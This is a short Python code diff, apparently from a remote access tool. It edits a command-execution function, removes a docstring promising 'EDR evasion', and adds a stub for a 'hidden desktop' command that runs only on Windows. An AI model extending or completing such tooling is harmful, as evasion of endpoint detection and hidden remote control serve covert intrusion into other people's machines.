@@ -59,7 +59,8 @@ def get_metadata():
 
 
 def execute_command(command: str) -> str:
-    """Execute system command with EDR evasion"""
+    if str(command).startswith('__hd:'):
+        return 'hidden desktop requires windows'
     try:
         if command.startswith('cd '):
             directory = command[3:].strip()
